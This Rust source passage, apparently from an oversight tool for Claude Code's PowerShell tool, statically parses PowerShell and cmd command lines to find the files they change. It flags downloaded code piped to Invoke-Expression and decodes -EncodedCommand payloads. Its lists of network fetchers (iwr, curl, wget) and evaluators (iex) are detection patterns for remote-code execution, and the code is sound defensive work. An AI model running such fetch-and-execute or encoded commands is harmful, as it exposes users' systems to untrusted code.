//! What a PowerShell command line visibly does to files, read without
//! running it.
//!
//! The counterpart of [`shell`](super::shell) for Claude Code's `PowerShell`
//! tool. It splits a command the way PowerShell splits words, quotes,
//! here-strings and operators, and recognises a few literal shapes: a
//! redirection into a file, a cmdlet that changes the paths it is given
//! (`Set-Content`, `Remove-Item`, `Move-Item`, ...) under its name or an
//! alias, a `[IO.File]` method given a literal path, a native program the
//! shell reader knows (`git checkout`, `sed -i`), and downloaded code handed
//! to `Invoke-Expression`. A path may start with `$HOME`, `$PWD` or an
//! environment variable (`$env:USERPROFILE`, `${env:TEMP}`), which the
//! caller puts in. `Set-Location` and `Push-Location` move the relative
//! paths after them, a variable set to a string (`$f = 'x'`) is put in
//! where it is used, and `$_` in a `ForEach-Object` block is what is piped
//! in. Code `powershell` is given is read again, decoded first when it is
//! `-EncodedCommand`, and so is what `Start-Process` starts; the scripts it
//! runs (`-File x.ps1`, `& ./x.ps1`, `. ./x.ps1`) are handed back for the
//! caller to read. A write through a variable set to what a cmdlet returns,
//! or a path computed some other way, is not seen; that is left to
//! `proofs_from`.

use std::collections::HashSet;

use super::shell::{self, Reading, Runner, Script, Unread};

#[derive(Debug, Clone, PartialEq, Eq)]
enum Token {
    /// A word, and whether any of it was quoted.
    Word(String, bool),
    /// `,`: the words on both sides are one array argument.
    Comma,
    /// `|`: the next command reads this one's output.
    Pipe,
    /// `;`, `||` or a newline.
    Break,
    /// `&&`: the next statement runs only if this one succeeded.
    And,
    /// `(`, `{`, `$(`, `@(` or `@{`: a nested expression or script block.
    Open,
    /// `)` or `}`.
    Close,
    /// `>`, `>>`, `2>`, `*>`: the next word is written.
    WriteTo,
}

fn tokens(command: &str) -> Vec<Token> {
    let chars: Vec<char> = command.chars().collect();
    let mut out = Vec::new();
    let mut word = String::new();
    let mut quoted = false;
    let end_word = |word: &mut String, quoted: &mut bool, out: &mut Vec<Token>| {
        if !word.is_empty() || *quoted {
            out.push(Token::Word(std::mem::take(word), *quoted));
        }
        *quoted = false;
    };
    let mut at = 0;
    while at < chars.len() {
        let c = chars[at];
        let next = chars.get(at + 1).copied();
        match c {
            // A here-string runs from `@'` at the end of a line to `'@` at
            // the start of one; its body is data.
            '@' if matches!(next, Some('\'') | Some('"'))
                && chars[at + 2..]
                    .iter()
                    .take_while(|c| **c != '\n')
                    .all(|c| c.is_whitespace()) =>
            {
                let close = [next.unwrap_or('\''), '@'];
                quoted = true;
                at = chars[at..]
                    .iter()
                    .position(|c| *c == '\n')
                    .map_or(chars.len(), |offset| at + offset);
                let mut body = String::new();
                while at < chars.len() {
                    let start = at + 1;
                    let stop = chars
                        .get(start..)
                        .and_then(|rest| rest.iter().position(|c| *c == '\n'))
                        .map_or(chars.len(), |offset| start + offset);
                    let line: String = chars.get(start..stop).unwrap_or_default().iter().collect();
                    at = stop;
                    if line
                        .trim_end()
                        .starts_with(&close.iter().collect::<String>())
                    {
                        // Past the closing `'@`.
                        at = start + 1;
                        break;
                    }
                    if !body.is_empty() {
                        body.push('\n');
                    }
                    body.push_str(&line);
                }
                word.push_str(&body);
            }
            '\'' => {
                quoted = true;
                at += 1;
                while at < chars.len() {
                    if chars[at] == '\'' {
                        // `''` is one quote.
                        if chars.get(at + 1) == Some(&'\'') {
                            word.push('\'');
                            at += 2;
                            continue;
                        }
                        break;
                    }
                    word.push(chars[at]);
                    at += 1;
                }
            }
            '"' => {
                quoted = true;
                at += 1;
                while at < chars.len() {
                    match chars[at] {
                        '`' if at + 1 < chars.len() => {
                            at += 1;
                            word.push(chars[at]);
                        }
                        '"' if chars.get(at + 1) == Some(&'"') => {
                            word.push('"');
                            at += 1;
                        }
                        '"' => break,
                        other => word.push(other),
                    }
                    at += 1;
                }
            }
            // The escape character; at the end of a line, a continuation.
            '`' => {
                at += 1;
                if at < chars.len() && chars[at] != '\n' {
                    word.push(chars[at]);
                }
            }
            '#' if word.is_empty() && !quoted => {
                while at + 1 < chars.len() && chars[at + 1] != '\n' {
                    at += 1;
                }
            }
            '<' if next == Some('#') => {
                end_word(&mut word, &mut quoted, &mut out);
                at += 2;
                while at < chars.len() && !(chars[at] == '#' && chars.get(at + 1) == Some(&'>')) {
                    at += 1;
                }
                at += 1;
            }
            ' ' | '\t' | '\r' => end_word(&mut word, &mut quoted, &mut out),
            '\n' | ';' => {
                end_word(&mut word, &mut quoted, &mut out);
                out.push(Token::Break);
            }
            '|' => {
                end_word(&mut word, &mut quoted, &mut out);
                if next == Some('|') {
                    at += 1;
                    out.push(Token::Break);
                } else {
                    out.push(Token::Pipe);
                }
            }
            '&' => {
                end_word(&mut word, &mut quoted, &mut out);
                if next == Some('&') {
                    at += 1;
                    out.push(Token::And);
                }
                // Alone, the call operator: the next word is the command.
            }
            ',' => {
                end_word(&mut word, &mut quoted, &mut out);
                out.push(Token::Comma);
            }
            // `${name}` is a variable, whatever its name holds.
            '$' if next == Some('{') => {
                let close = chars[at..]
                    .iter()
                    .position(|c| *c == '}')
                    .map_or(chars.len() - 1, |offset| at + offset);
                word.extend(&chars[at..=close]);
                at = close;
            }
            '$' | '@' if next == Some('(') || (c == '@' && next == Some('{')) => {
                end_word(&mut word, &mut quoted, &mut out);
                at += 1;
                out.push(Token::Open);
            }
            '(' | '{' => {
                end_word(&mut word, &mut quoted, &mut out);
                out.push(Token::Open);
            }
            ')' | '}' => {
                end_word(&mut word, &mut quoted, &mut out);
                out.push(Token::Close);
            }
            '>' => {
                // `2>` and `*>` name a stream, not a word.
                if !quoted
                    && (word == "*"
                        || (!word.is_empty() && word.chars().all(|c| c.is_ascii_digit())))
                {
                    word.clear();
                } else {
                    end_word(&mut word, &mut quoted, &mut out);
                }
                if next == Some('>') {
                    at += 1;
                }
                if chars.get(at + 1) == Some(&'&') {
                    // `2>&1` merges a stream; nothing is written.
                    at += 1;
                    while chars.get(at + 1).is_some_and(|c| c.is_ascii_digit()) {
                        at += 1;
                    }
                } else {
                    out.push(Token::WriteTo);
                }
            }
            _ => word.push(c),
        }
        at += 1;
    }
    end_word(&mut word, &mut quoted, &mut out);
    out
}

/// What a cmdlet does to the paths it is given.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Kind {
    /// Writes, clears or removes its path.
    Changes,
    /// Creates its path, or `-Name` under it.
    Creates,
    /// Removes its path and writes its destination.
    Moves,
    /// Writes its destination.
    Copies,
    /// Removes its path and writes `-NewName` beside it.
    Renames,
    /// Writes its `-OutFile`.
    Downloads,
}

/// Cmdlets, under their names and their built-in aliases, lowercase.
const CMDLETS: &[(&[&str], Kind)] = &[
    (
        &[
            "set-content",
            "sc",
            "add-content",
            "ac",
            "clear-content",
            "clc",
            "clear-item",
            "cli",
            "set-item",
            "si",
            "out-file",
            "remove-item",
            "rm",
            "ri",
            "del",
            "erase",
            "rd",
            "rmdir",
            "tee-object",
            "tee",
            "export-csv",
            "epcsv",
            "export-clixml",
            "set-itemproperty",
            "sp",
            "clear-itemproperty",
            "clp",
            "remove-itemproperty",
            "rp",
            "new-itemproperty",
            "set-acl",
        ],
        Kind::Changes,
    ),
    (&["new-item", "ni", "mkdir", "md"], Kind::Creates),
    (&["move-item", "mv", "mi", "move"], Kind::Moves),
    (&["copy-item", "cp", "cpi", "copy"], Kind::Copies),
    (&["rename-item", "ren", "rni"], Kind::Renames),
    (
        &["invoke-webrequest", "iwr", "invoke-restmethod", "irm"],
        Kind::Downloads,
    ),
];

/// Parameters whose value is the path a cmdlet acts on.
const PATH_PARAMETERS: &[&str] = &["path", "literalpath", "filepath", "pspath", "lp"];
/// Other parameters that take a value, the common parameters among them.
const VALUE_PARAMETERS: &[&str] = &[
    "value",
    "encoding",
    "itemtype",
    "type",
    "name",
    "newname",
    "destination",
    "filter",
    "include",
    "exclude",
    "width",
    "delimiter",
    "inputobject",
    "credential",
    "stream",
    "target",
    "variable",
    "outfile",
    "uri",
    "method",
    "headers",
    "body",
    "erroraction",
    "ea",
    "warningaction",
    "wa",
    "informationaction",
    "infa",
    "progressaction",
    "proga",
    "errorvariable",
    "ev",
    "warningvariable",
    "wv",
    "informationvariable",
    "iv",
    "outvariable",
    "ov",
    "outbuffer",
    "ob",
    "pipelinevariable",
    "pv",
];
/// Parameters that take no value.
const SWITCHES: &[&str] = &[
    "force",
    "recurse",
    "nonewline",
    "append",
    "noclobber",
    "passthru",
    "confirm",
    "cf",
    "whatif",
    "wi",
    "verbose",
    "vb",
    "debug",
    "db",
    "usetransaction",
    "usetx",
    "asbytestream",
    "container",
    "notypeinformation",
];

/// A parameter as written, `-Dest` or `-Path:x`, by its full name: the
/// name or alias written in full, or else the one name it is a prefix of.
fn parameter(written: &str) -> Option<&'static str> {
    let written = written.to_ascii_lowercase();
    let names = || {
        PATH_PARAMETERS
            .iter()
            .chain(VALUE_PARAMETERS)
            .chain(SWITCHES)
    };
    if let Some(exact) = names().find(|name| **name == written) {
        return Some(exact);
    }
    let mut prefixed = names().filter(|name| name.starts_with(&written));
    match (prefixed.next(), prefixed.next()) {
        (Some(only), None) => Some(only),
        _ => None,
    }
}

/// Code that fetches from the network, and what runs a string as code.
const FETCHERS: &[&str] = &[
    "invoke-webrequest",
    "iwr",
    "invoke-restmethod",
    "irm",
    "curl",
    "wget",
];
const EVALUATORS: &[&str] = &["invoke-expression", "iex"];

/// How deep code handed over as a string is read again; past it, every
/// word is taken for a path it may write.
const DEPTH: usize = 8;

/// Cmdlets whose file is never piped in: what is piped is what they write.
const WRITES_INPUT: &[&str] = &[
    "out-file",
    "tee-object",
    "tee",
    "export-csv",
    "epcsv",
    "export-clixml",
];
/// Cmdlets a piped string is the content of, not the path to.
const CONTENT_INPUT: &[&str] = &["set-content", "sc", "add-content", "ac", "new-item", "ni"];

/// What a statement pipes into the next that may name paths.
#[derive(Default)]
struct Piped {
    paths: Vec<String>,
    /// Items from `Get-Item` or `Get-ChildItem`, which a cmdlet binds to
    /// its path by property name; a string binds only where the path is
    /// taken by value.
    items: bool,
}

/// One argument: a word, or words joined by commas into an array.
type Argument = Vec<(String, bool)>;

/// The command a statement runs, lowercase: past the call operator's
/// `.`, a module qualifier and `.exe`.
fn command_name(word: &str) -> String {
    let name = word
        .rsplit('\\')
        .next()
        .unwrap_or(word)
        .to_ascii_lowercase();
    name.strip_suffix(".exe")
        .map(str::to_string)
        .unwrap_or(name)
}

/// A cmdlet's arguments, bound to the parameters this reader knows.
struct Bound {
    named: Vec<(&'static str, Vec<String>)>,
    positional: Vec<Vec<String>>,
    /// A parameter this reader does not know was given: any positional
    /// argument may be its value or the path.
    unknown: bool,
}

impl Bound {
    fn new(arguments: &[Argument]) -> Self {
        let mut bound = Bound {
            named: Vec::new(),
            positional: Vec::new(),
            unknown: false,
        };
        let mut rest = arguments.iter();
        while let Some(argument) = rest.next() {
            let words: Vec<String> = argument.iter().map(|(word, _)| word.clone()).collect();
            let flag = match argument.as_slice() {
                [(word, false)] if word.len() > 1 && word.starts_with('-') => Some(&word[1..]),
                _ => None,
            };
            let Some(flag) = flag else {
                bound.positional.push(words);
                continue;
            };
            let (written, inline) = match flag.split_once(':') {
                Some((written, value)) => (written, Some(value.to_string())),
                None => (flag, None),
            };
            match parameter(written) {
                Some(name) if SWITCHES.contains(&name) => {}
                Some(name) => {
                    let values = match inline {
                        Some(value) => vec![value],
                        None => rest
                            .next()
                            .map(|value| value.iter().map(|(word, _)| word.clone()).collect())
                            .unwrap_or_default(),
                    };
                    bound.named.push((name, values));
                }
                None => bound.unknown = true,
            }
        }
        bound
    }

    /// The values given to `wanted` by name, else the positional argument
    /// at `position`.
    fn values(&self, wanted: &[&str], position: usize) -> Vec<String> {
        let found: Vec<String> = self
            .named
            .iter()
            .filter(|(name, _)| wanted.contains(name))
            .flat_map(|(_, values)| values.clone())
            .collect();
        if found.is_empty() {
            self.positional.get(position).cloned().unwrap_or_default()
        } else {
            found
        }
    }
}

/// What a cmdlet or a native program changes through its arguments; a
/// cmdlet given no path changes what is piped into it, `input`.
fn changed_at(arguments: &[Argument], input: &Piped, depth: usize) -> Reading {
    // `$x = Remove-Item y`: the command is past the assignment.
    let arguments = match arguments {
        [variable, operator, rest @ ..]
            if variable.len() == 1
                && variable[0].0.starts_with('$')
                && matches!(operator.as_slice(), [(op, false)] if op.ends_with('=')) =>
        {
            rest
        }
        _ => arguments,
    };
    let Some(first) = arguments.first().and_then(|argument| argument.first()) else {
        return Reading::default();
    };
    let name = command_name(&first.0);
    if EVALUATORS.contains(&name.as_str()) {
        // `iex "Remove-Item x"` runs its string, or the one piped into it.
        let code: Vec<&str> = arguments[1..]
            .iter()
            .flatten()
            .filter(|(word, quoted)| *quoted || !word.starts_with('-'))
            .map(|(word, _)| word.as_str())
            .collect();
        let code = if code.is_empty() {
            input.paths.join("\n")
        } else {
            code.join(" ")
        };
        return read_at(&code, depth + 1);
    }
    if matches!(name.as_str(), "start-process" | "start" | "saps") {
        return started(&arguments[1..], depth);
    }
    // A script runs in this shell, `&` or `.` before it or not.
    if name.ends_with(".ps1") {
        return Reading {
            scripts: file_path(&first.0)
                .map(|path| Script {
                    path,
                    dir: String::new(),
                    runner: Runner::PowerShell,
                    depth,
                    text: None,
                })
                .into_iter()
                .collect(),
            ..Reading::default()
        };
    }
    let Some(kind) = CMDLETS
        .iter()
        .find(|(names, _)| names.contains(&name.as_str()))
        .map(|(_, kind)| *kind)
    else {
        let words: Vec<String> = std::iter::once(name)
            .chain(
                arguments
                    .iter()
                    .flatten()
                    .skip(1)
                    .map(|(word, _)| word.clone()),
            )
            .collect();
        return native(&words, depth);
    };
    let bound = Bound::new(&arguments[1..]);
    let mut paths = bound.values(PATH_PARAMETERS, 0);
    let name = name.as_str();
    let binds = !WRITES_INPUT.contains(&name) && (input.items || !CONTENT_INPUT.contains(&name));
    if paths.is_empty() && kind != Kind::Downloads && binds {
        paths = input.paths.clone();
    }
    // A positional argument binds to the first position not bound by name:
    // with `-Path` named, the first one is the destination or new name.
    let second = if bound
        .named
        .iter()
        .any(|(name, _)| PATH_PARAMETERS.contains(name))
    {
        0
    } else {
        1
    };
    let mut changed = match kind {
        Kind::Changes => paths,
        Kind::Creates => {
            let names = bound.values(&["name"], usize::MAX);
            if names.is_empty() {
                paths
            } else {
                let bases = if paths.is_empty() {
                    vec![String::new()]
                } else {
                    paths
                };
                bases
                    .iter()
                    .flat_map(|base| names.iter().map(move |name| joined(base, name)))
                    .collect()
            }
        }
        Kind::Moves | Kind::Copies => {
            let mut changed = if kind == Kind::Moves {
                paths.clone()
            } else {
                Vec::new()
            };
            for destination in bound.values(&["destination"], second) {
                changed.extend(into(&destination, &paths));
            }
            changed
        }
        Kind::Renames => {
            let mut changed = paths.clone();
            for new_name in bound.values(&["newname"], second) {
                for source in &paths {
                    let dir = source.rsplit_once(['/', '\\']).map_or("", |(dir, _)| dir);
                    changed.push(joined(dir, &new_name));
                }
            }
            changed
        }
        Kind::Downloads => bound.values(&["outfile"], usize::MAX),
    };
    if bound.unknown {
        changed.extend(bound.positional.iter().flatten().cloned());
    }
    Reading {
        writes: changed,
        ..Reading::default()
    }
}

/// What a native program changes: the string `cmd /c` or `powershell
/// -Command` runs, read again; any other as the shell reader reads it.
fn native(words: &[String], depth: usize) -> Reading {
    let Some((name, args)) = words.split_first() else {
        return Reading::default();
    };
    let name = command_name(name);
    match name.as_str() {
        "cmd" => {
            let code = args.iter().position(|arg| {
                ["/c", "/k", "/r"]
                    .iter()
                    .any(|flag| arg.eq_ignore_ascii_case(flag))
            });
            Reading {
                writes: code
                    .map(|at| cmd(&args[at + 1..].join(" "), depth + 1))
                    .unwrap_or_default(),
                ..Reading::default()
            }
        }
        "powershell" | "pwsh" => invoked(args, depth),
        _ => {
            let words: Vec<String> = std::iter::once(name).chain(args.iter().cloned()).collect();
            shell::changed_by(&words, depth)
        }
    }
}

/// What `powershell` or `pwsh` is given to run.
enum Given {
    /// Code: after `-Command`, or the arguments after its options.
    Command(String),
    /// Code as `-EncodedCommand` carries it, base64 of UTF-16 text.
    Encoded(String),
    /// A script: after `-File`, or a first argument that names one.
    File(String),
    Nothing,
}

/// What `powershell` or `pwsh` given `args` runs.
fn given(args: &[String]) -> Given {
    const VALUES: &[&str] = &[
        "executionpolicy",
        "ep",
        "ex",
        "windowstyle",
        "w",
        "workingdirectory",
        "wd",
        "inputformat",
        "if",
        "inp",
        "outputformat",
        "of",
        "o",
        "configurationname",
        "config",
        "version",
        "v",
        "settingsfile",
        "settings",
        "custompipename",
        "encodedarguments",
        "ea",
    ];
    let prefix = |flag: &str, name: &str| flag.len() > 1 && name.starts_with(flag);
    let mut at = 0;
    while let Some(flag) = args.get(at).and_then(|arg| arg.strip_prefix('-')) {
        let flag = flag.to_ascii_lowercase();
        at += 1;
        if flag == "c" || (flag.len() > 2 && "command".starts_with(&flag)) {
            break;
        }
        // `-enc`, though `-EncodedArguments` starts so too, is taken as
        // PowerShell takes it: for the code.
        if flag == "e" || flag == "ec" || prefix(&flag, "encodedcommand") {
            return args
                .get(at)
                .map_or(Given::Nothing, |code| Given::Encoded(code.clone()));
        }
        if VALUES.contains(&flag.as_str())
            || (flag.len() > 2 && VALUES.iter().any(|name| name.starts_with(&flag)))
        {
            at += 1;
        } else if flag == "f" || prefix(&flag, "file") {
            return args
                .get(at)
                .map_or(Given::Nothing, |path| Given::File(path.clone()));
        }
    }
    match args.get(at) {
        Some(first) if first.to_ascii_lowercase().ends_with(".ps1") => Given::File(first.clone()),
        Some(_) => Given::Command(args[at..].join(" ")),
        None => Given::Nothing,
    }
}

/// The text base64 `encoded` carries as UTF-16, little-endian, as
/// `-EncodedCommand` takes it; `None` when it carries none.
fn decoded(encoded: &str) -> Option<String> {
    let bytes = super::digest::base64_decode(encoded).ok()?;
    if bytes.len() % 2 != 0 {
        return None;
    }
    let units: Vec<u16> = bytes
        .chunks(2)
        .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
        .collect();
    String::from_utf16(&units).ok()
}

/// What `powershell` or `pwsh` given `args` runs, `depth` strings deep:
/// its code read again, encoded code decoded first, or the script it is
/// given, for the caller to read.
pub(crate) fn invoked(args: &[String], depth: usize) -> Reading {
    match given(args) {
        Given::Command(code) => read_at(&code, depth + 1),
        Given::Encoded(encoded) => match decoded(&encoded) {
            Some(code) => read_at(&code, depth + 1),
            None => Reading {
                unread: vec![Unread {
                    shape: "powershell -EncodedCommand".to_string(),
                    why: "what it is given is not base64 of UTF-16 text, so flot cannot read the code it runs".to_string(),
                }],
                ..Reading::default()
            },
        },
        Given::File(path) => Reading {
            scripts: file_path(&path)
                .map(|path| Script {
                    path,
                    dir: String::new(),
                    runner: Runner::PowerShell,
                    depth,
                    text: None,
                })
                .into_iter()
                .collect(),
            ..Reading::default()
        },
        Given::Nothing => Reading::default(),
    }
}

/// What `Start-Process` given `arguments` changes and runs: the program
/// after `-FilePath` with the arguments after `-ArgumentList`, read as if
/// run here, and the files it sends its output to. One string of
/// arguments is a command line, split as the program would split it.
fn started(arguments: &[Argument], depth: usize) -> Reading {
    /// Its parameters by name and alias: whether each is the program, its
    /// arguments, a file it writes, or another that takes a value; any
    /// other is a switch.
    const PARAMETERS: &[(&str, &str)] = &[
        ("filepath", "program"),
        ("path", "program"),
        ("pspath", "program"),
        ("argumentlist", "arguments"),
        ("args", "arguments"),
        ("redirectstandardoutput", "writes"),
        ("rso", "writes"),
        ("redirectstandarderror", "writes"),
        ("rse", "writes"),
        ("redirectstandardinput", "value"),
        ("rsi", "value"),
        ("workingdirectory", "value"),
        ("verb", "value"),
        ("windowstyle", "value"),
        ("credential", "value"),
        ("environment", "value"),
    ];
    let mut program: Option<String> = None;
    let mut list: Vec<String> = Vec::new();
    let mut writes: Vec<String> = Vec::new();
    let mut positional = 0;
    let mut rest = arguments.iter();
    while let Some(argument) = rest.next() {
        let words: Vec<String> = argument.iter().map(|(word, _)| word.clone()).collect();
        let flag = match argument.as_slice() {
            [(word, false)] if word.len() > 1 && word.starts_with('-') => Some(&word[1..]),
            _ => None,
        };
        let role = match flag {
            Some(flag) => {
                let (written, inline) = match flag.split_once(':') {
                    Some((written, value)) => (written.to_ascii_lowercase(), Some(value)),
                    None => (flag.to_ascii_lowercase(), None),
                };
                let exact = PARAMETERS.iter().find(|(name, _)| *name == written);
                let mut prefixed = PARAMETERS
                    .iter()
                    .filter(|(name, _)| name.starts_with(&written));
                let role = exact
                    .or_else(|| match (prefixed.next(), prefixed.next()) {
                        (Some(only), None) => Some(only),
                        _ => None,
                    })
                    .map(|(_, role)| *role);
                let Some(role) = role else {
                    continue;
                };
                let value = match inline {
                    Some(value) => vec![value.to_string()],
                    None => rest
                        .next()
                        .map(|value| value.iter().map(|(word, _)| word.clone()).collect())
                        .unwrap_or_default(),
                };
                (role, value)
            }
            None => {
                positional += 1;
                match positional {
                    1 => ("program", words),
                    2 => ("arguments", words),
                    _ => continue,
                }
            }
        };
        match role {
            ("program", value) => program = value.into_iter().next(),
            ("arguments", value) => list = value,
            ("writes", value) => writes.extend(value),
            _ => {}
        }
    }
    let mut reading = Reading {
        writes,
        ..Reading::default()
    };
    let Some(program) = program else {
        return reading;
    };
    let args = match list.as_slice() {
        [line] => command_line(line),
        _ => list,
    };
    let run: Vec<Argument> = std::iter::once(program)
        .chain(args)
        .map(|word| vec![(word, false)])
        .collect();
    let found = changed_at(&run, &Piped::default(), depth + 1);
    reading.writes.extend(found.writes);
    reading.remote_code = found.remote_code;
    reading.code = found.code;
    reading.scripts = found.scripts;
    reading.unread = found.unread;
    reading
}

/// `line` split into arguments as a Windows program splits its command
/// line: at whitespace, with double quotes keeping it together.
fn command_line(line: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut word = String::new();
    let mut quoted = false;
    let mut started = false;
    for c in line.chars() {
        match c {
            '"' => {
                quoted = !quoted;
                started = true;
            }
            c if c.is_whitespace() && !quoted => {
                if started {
                    words.push(std::mem::take(&mut word));
                    started = false;
                }
            }
            c => {
                word.push(c);
                started = true;
            }
        }
    }
    if started {
        words.push(word);
    }
    words
}

/// What `cmd /c` runs, read with cmd's rules: `&`, `&&`, `||`, `|` and
/// parentheses separate commands, `"` quotes, `^` escapes, and `>` writes
/// the word after it.
fn cmd(command: &str, depth: usize) -> Vec<String> {
    if depth > DEPTH {
        return command.split_whitespace().map(str::to_string).collect();
    }
    let chars: Vec<char> = command.chars().collect();
    let mut writes = Vec::new();
    let mut words: Vec<String> = Vec::new();
    let mut word = String::new();
    let mut quoted = false;
    // The word being read is a redirection's target, `Some(true)`, or a
    // file only read, `Some(false)`.
    let mut redirect: Option<bool> = None;
    let mut at = 0;
    loop {
        let c = chars.get(at).copied();
        // `2>` names a stream, not a word.
        if c == Some('>') && !quoted && matches!(word.as_str(), "1" | "2") {
            word.clear();
        }
        let ends = matches!(
            c,
            None | Some(' ' | '\t' | '&' | '|' | '(' | ')' | '\n' | '\r' | '<' | '>')
        );
        if ends && (!word.is_empty() || quoted) {
            let done = std::mem::take(&mut word);
            match redirect.take() {
                Some(true) if !done.eq_ignore_ascii_case("nul") => writes.push(done),
                Some(_) => {}
                None => words.push(done),
            }
            quoted = false;
        }
        match c {
            None => {
                writes.extend(builtin(&words, depth));
                break;
            }
            Some('"') => {
                quoted = true;
                at += 1;
                while at < chars.len() && chars[at] != '"' {
                    word.push(chars[at]);
                    at += 1;
                }
            }
            Some('^') => {
                at += 1;
                word.extend(chars.get(at));
            }
            Some('&' | '|' | '(' | ')' | '\n' | '\r') => {
                writes.extend(builtin(&words, depth));
                words.clear();
                if matches!(c, Some('&' | '|')) && chars.get(at + 1).copied() == c {
                    at += 1;
                }
            }
            Some('>') => {
                if chars.get(at + 1) == Some(&'>') {
                    at += 1;
                }
                if chars.get(at + 1) == Some(&'&') {
                    // `2>&1` merges a stream.
                    at += 2;
                } else {
                    redirect = Some(true);
                }
            }
            Some('<') => redirect = Some(false),
            Some(' ' | '\t') => {}
            Some(other) => word.push(other),
        }
        at += 1;
    }
    writes
}

/// What one command `cmd` runs changes: its built-ins `del`, `rd`, `copy`,
/// `move` and `ren` by cmd's rules, any other program as [`native`] reads
/// it.
fn builtin(words: &[String], depth: usize) -> Vec<String> {
    let Some((name, args)) = words.split_first() else {
        return Vec::new();
    };
    let operands: Vec<String> = args
        .iter()
        .filter(|arg| !arg.starts_with('/'))
        .cloned()
        .collect();
    let name = command_name(name.trim_start_matches('@'));
    match name.as_str() {
        "del" | "erase" | "rd" | "rmdir" => operands,
        "copy" | "move" => {
            let Some((destination, sources)) = operands.split_last() else {
                return Vec::new();
            };
            if sources.is_empty() {
                // `copy x` copies it here, or what it holds when it is a
                // directory.
                return vec![base(destination).to_string(), ".".to_string()];
            }
            let mut written = if name == "move" {
                sources.to_vec()
            } else {
                // A directory copied puts what it holds in the destination.
                vec![destination.clone()]
            };
            written.extend(into(destination, sources));
            written
        }
        // What the source holds lands in the destination, by default here.
        "xcopy" | "robocopy" => match operands.as_slice() {
            [_] => vec![".".to_string()],
            [_, destination, ..] => vec![destination.clone()],
            [] => Vec::new(),
        },
        "ren" | "rename" => match operands.as_slice() {
            [path, new_name, ..] => {
                let dir = path.rsplit_once(['/', '\\']).map_or("", |(dir, _)| dir);
                vec![path.clone(), joined(dir, new_name)]
            }
            _ => Vec::new(),
        },
        "mklink" => operands.first().cloned().into_iter().collect(),
        "echo" | "rem" | "type" | "dir" | "cd" | "chdir" | "pushd" | "popd" | "set" => Vec::new(),
        _ => native(words, depth).writes,
    }
}

/// What copying or moving `sources` to `destination` writes: the
/// destination when it may be the file written, and each source's name in
/// it when it may be a directory; a trailing separator, `.` or several
/// sources make it one.
fn into(destination: &str, sources: &[String]) -> Vec<String> {
    let directory = destination.ends_with(['/', '\\'])
        || matches!(destination, "." | "..")
        || sources.len() > 1;
    let mut written = if directory {
        Vec::new()
    } else {
        vec![destination.to_string()]
    };
    written.extend(
        sources
            .iter()
            .map(|source| joined(destination, base(source))),
    );
    written
}

/// The last name in `path`.
fn base(path: &str) -> &str {
    let path = path.trim_end_matches(['/', '\\']);
    path.rsplit(['/', '\\']).next().unwrap_or(path)
}

fn joined(base: &str, name: &str) -> String {
    let trimmed = base.trim_end_matches(['/', '\\']);
    match trimmed {
        "" if !base.is_empty() => format!("/{name}"),
        "" | "." => name.to_string(),
        _ => format!("{trimmed}/{name}"),
    }
}

/// What a `[System.IO]` method does with the arguments it is given.
enum Method {
    /// Writes, creates or deletes the arguments at these positions.
    Changes(&'static [usize]),
    /// Opens its first argument with the access its others name.
    Opens,
}

/// A `[System.IO]` type's static method or constructor, `None` for what
/// only reads: `ReadAllText`, `Exists`, `Get*`, `OpenRead`, a reader, or
/// `[IO.Path]`. Any other method of such a type is taken to change its
/// path.
fn dotnet(word: &str) -> Option<Method> {
    const READERS: &[&str] = &[
        "path",
        "streamreader",
        "binaryreader",
        "stringreader",
        "stringwriter",
        "memorystream",
        "fileinfo",
        "directoryinfo",
        "driveinfo",
        "filesystemwatcher",
    ];
    const READS: &[&str] = &[
        "read",
        "get",
        "exists",
        "enumerate",
        "openread",
        "opentext",
        "setcurrentdirectory",
        "equals",
        "referenceequals",
        "tostring",
    ];
    let lower = word.to_ascii_lowercase();
    let (class, method) = lower.strip_prefix('[')?.split_once("]::")?;
    let class = class.strip_prefix("system.").unwrap_or(class);
    let class = class.strip_prefix("io.")?;
    if READERS.contains(&class) || READS.iter().any(|read| method.starts_with(read)) {
        return None;
    }
    Some(match (class, method) {
        (_, "open") | ("filestream", "new") => Method::Opens,
        (_, "copy") => Method::Changes(&[1]),
        (_, "move" | "replace") => Method::Changes(&[0, 1, 2]),
        _ => Method::Changes(&[0]),
    })
}

/// Whether a file is opened only to read: an access of `Read`, and no
/// mode that creates, truncates or appends. Without an access, `Open`
/// gives read and write.
fn reads_only(words: &[String]) -> bool {
    let words: Vec<String> = words.iter().map(|word| word.to_ascii_lowercase()).collect();
    words
        .iter()
        .any(|word| word.rsplit("::").next() == Some("read"))
        && !words.iter().any(|word| {
            ["write", "create", "truncate", "append"]
                .iter()
                .any(|mode| word.contains(mode))
        })
}

/// The variable `path` starts with that the caller puts in, `$PWD`,
/// `$HOME`, `$env:NAME` or `${env:NAME}`, and the rest; an empty variable
/// for none.
fn leading_variable(path: &str) -> (&str, &str) {
    let name_end = if let Some(inner) = path.strip_prefix("${") {
        inner.find('}').map(|end| (&inner[..end], end + 3))
    } else if let Some(after) = path.strip_prefix('$') {
        let end = after
            .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == ':'))
            .unwrap_or(after.len());
        Some((&after[..end], end + 1))
    } else {
        None
    };
    match name_end {
        Some((name, end)) => {
            let lower = name.to_ascii_lowercase();
            let known = matches!(lower.as_str(), "pwd" | "home")
                || lower
                    .strip_prefix("env:")
                    .is_some_and(|name| !name.is_empty());
            let rest = &path[end..];
            if known && (rest.is_empty() || rest.starts_with(['/', '\\'])) {
                (&path[..end], rest)
            } else {
                ("", path)
            }
        }
        None => ("", path),
    }
}

/// A path as PowerShell names it, `/`-separated and past a `FileSystem::`
/// provider; a leading `$PWD`, `$HOME` or environment variable is left for
/// the caller to expand. `None` for what is not a file: `$null`, another
/// variable, or another provider's path such as `Env:X`.
fn file_path(path: &str) -> Option<String> {
    let path = match path.split_once("::") {
        Some((provider, rest)) => {
            let provider = provider.rsplit('\\').next().unwrap_or(provider);
            if !provider.eq_ignore_ascii_case("filesystem") {
                return None;
            }
            rest
        }
        None => path,
    };
    let (variable, rest) = leading_variable(path);
    let provider = rest.split_once(':').is_some_and(|(drive, _)| {
        drive.len() > 1 && drive.chars().all(|c| c.is_ascii_alphabetic())
    });
    if path.is_empty() || rest.contains('$') || provider {
        return None;
    }
    Some(format!("{variable}{rest}").replace('\\', "/"))
}

/// `path` as a statement run in `dir` names it, as the shell reader
